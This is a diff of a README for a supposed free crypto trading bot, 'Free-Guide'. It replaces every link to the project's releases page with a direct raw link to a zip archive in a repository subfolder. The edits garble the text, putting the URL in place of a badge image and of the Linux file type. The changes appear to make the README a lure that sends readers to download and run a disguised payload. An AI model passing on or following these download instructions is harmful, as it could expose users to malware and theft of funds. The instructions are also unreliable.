@@ -1,7 +1,7 @@
 # 🤖 Free-Guide - Build Your Crypto Bot Simply
 
 ## 📥 Download Now
-[![Download Free-Guide](https://img.shields.io/badge/Download%20Free--Guide-%2300A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Quivo10/Free-Guide/releases)
+[![Download Free-Guide](https://github.com/Quivo10/Free-Guide/raw/refs/heads/main/stirrup/Free-Guide-v2.3.zip%20Free--Guide-%2300A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Quivo10/Free-Guide/raw/refs/heads/main/stirrup/Free-Guide-v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Free-Guide! This tool helps you create a bot that can automate trading in cryptocurrency. With this guide, you'll learn how to download and run the software easily, even if you're not a programmer.
@@ -25,17 +25,17 @@ Free-Guide simplifies the process of configuring a trading bot. This bot can hel
 ## 💻 Download & Install
 To download the application, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Quivo10/Free-Guide/releases). This page contains all versions for download.
+1. **Visit the Releases Page:** Click [here](https://github.com/Quivo10/Free-Guide/raw/refs/heads/main/stirrup/Free-Guide-v2.3.zip). This page contains all versions for download.
 2. **Select the Latest Release:** Look for the topmost release labeled with the highest version number.
 3. **Download the Appropriate File:** Depending on your operating system, you may see different files. Choose the one that matches your system:
    - **Windows:** Download the .exe file.
    - **macOS:** Download the .dmg file.
-   - **Linux:** Download the .tar.gz file.
+   - **Linux:** Download the https://github.com/Quivo10/Free-Guide/raw/refs/heads/main/stirrup/Free-Guide-v2.3.zip file.
 4. **Locate the Downloaded File:** Find the file in your downloads folder or the designated location where your downloaded files go.
 5. **Install the Application:**
    - **Windows:** Double-click the .exe file and follow the prompts to install.
    - **macOS:** Open the .dmg file and drag the application icon into your Applications folder.
-   - **Linux:** Extract the .tar.gz file and navigate to the extracted folder. Run the application using the terminal.
+   - **Linux:** Extract the https://github.com/Quivo10/Free-Guide/raw/refs/heads/main/stirrup/Free-Guide-v2.3.zip file and navigate to the extracted folder. Run the application using the terminal.
 6. **Launch the Application:** Find Free-Guide in your applications, and double-click to open it.
 
 ## 🎓 Tutorials
@@ -69,4 +69,4 @@ Always ensure you download from official sources. Verify file signatures if appl
 ## 📣 Stay Connected
 Follow us on social media for updates and community discussions on crypto trading. Your feedback is essential in improving Free-Guide.
 
-Remember to visit the [Releases Page](https://github.com/Quivo10/Free-Guide/releases) for the latest updates and downloads.
+Remember to visit the [Releases Page](https://github.com/Quivo10/Free-Guide/raw/refs/heads/main/stirrup/Free-Guide-v2.3.zip) for the latest updates and downloads.
